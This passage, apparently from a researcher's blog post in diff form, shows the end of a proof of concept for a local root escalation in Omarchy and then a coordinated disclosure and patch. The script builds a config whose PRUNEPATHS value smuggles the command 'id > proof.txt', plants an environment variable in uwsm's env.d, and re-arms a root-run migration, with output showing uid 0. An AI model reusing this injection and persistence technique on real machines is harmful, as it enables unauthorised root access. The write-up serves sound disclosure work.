+<span class="w">  </span><span class="nb">printf</span><span class="w"> </span><span class="s1">'PRUNEPATHS = "\\x22;id &gt; %s/proof.txt;:|ew "\n'</span><span class="w"> </span><span class="s2">"</span><span class="nv">$DIR</span><span class="s2">"</span>
+<span class="o">}</span><span class="w"> </span>&gt;<span class="w"> </span><span class="s2">"</span><span class="nv">$DIR</span><span class="s2">/payload.conf"</span>
+
+<span class="c1"># uwsm exports this into the whole graphical session on next login</span>
+mkdir<span class="w"> </span>-p<span class="w"> </span><span class="s2">"</span><span class="nv">$HOME</span><span class="s2">/.config/uwsm/env.d"</span>
+<span class="nb">echo</span><span class="w"> </span><span class="s2">"export OMARCHY_UPDATEDB_CONF_PATH=</span><span class="nv">$DIR</span><span class="s2">/payload.conf"</span><span class="w"> </span><span class="se">\</span>
+<span class="w">  </span>&gt;<span class="w"> </span><span class="s2">"</span><span class="nv">$HOME</span><span class="s2">/.config/uwsm/env.d/99-payload.conf"</span>
+
+<span class="c1"># re-arm the migration (marker dir is mine)</span>
+rm<span class="w"> </span>-f<span class="w"> </span><span class="s2">"</span><span class="nv">$HOME</span><span class="s2">/.local/state/omarchy/migrations/1784809451.sh"</span>
+</pre></div>
+<p>Drop that in <code>env.d</code> so the var is live for the whole session, reboot, and the next time the victim does the thing they&rsquo;re told/used to do/doing, root runs <code>id
+&gt; proof</code>.</p>
+<h2 id="root"><a href="#root">Root</a></h2>
+<pre><code>$ id
+uid=1000(uiop) gid=1000(uiop) groups=1000(uiop),998(wheel)
+# ...plant, reboot, apply the pending migration...
+$ cat ~/lpe/proof.txt
+uid=0(root) gid=0(root) groups=0(root)
+$ stat -c '%U' ~/lpe/proof.txt
+root</code></pre>
+<p>ヽ(°〇°)ﾉ</p>
+<h2 id="disclosure"><a href="#disclosure">Disclosure</a></h2>
+<p>Emailed <code>security@omarchy.org</code> with the affected files and line numbers, the before/after, and the minimal <code>id &gt; proof.txt</code> PoC.</p>
+<p>They responded with the following:</p>
+<div class="figure"><img src="email.png" alt="email">
+ <p class="caption">email</p></div>
+<h2 id="the-fix"><a href="#the-fix">The Fix</a></h2>
+<p>I am now posting this blog since the patch is out (<a href="https://github.com/omacom/omarchy/pull/10579">omacom/omarchy#10579</a>) which deletes the entire fucking mechanism. <code>install/config/locate.sh</code> is gone. The migration is gone. lol</p>
+<blockquote>
+ <p>The commit keeps the reporter credit. &ldquo;Reported by uiop / @wasdhjklxyz.&rdquo; :D</p></blockquote></section><div class="buttons-border"></div><div class="buttons"><a href="https://wasdhjkl.xyz"><img src="/buttons/uiop1.png" alt="wasdhjkl.xyz"></a><a href="https://wasdhjkl.xyz"><img src="/buttons/uiop1.gif" alt="wasdhjkl.xyz"></a></div><div class="buttons"><a href="https://melqtx.com"><img src="/buttons/mel.gif" alt="melqtx.com"></a><a href="https://luuumine.com"><img src="/buttons/luuumine.gif" alt="luuumine.com"></a><a href="https://lain.ovh"><img src="/buttons/lainovh.gif" alt="lain.ovh"></a></div><footer><a href="https://github.com/wasdhjklxyz">github</a><span class="sep"> · </span><a href="https://x.com/wasdhjklxyz">twitter</a><span class="sep"> · </span><a href="mailto:uiop@wasdhjkl.xyz">email</a><span class="sep"> · </span><a href="https://creativecommons.org/licenses/by-sa/4.0">© 2026 uiop. Licensed under CC BY-SA 4.0</a></footer></html>
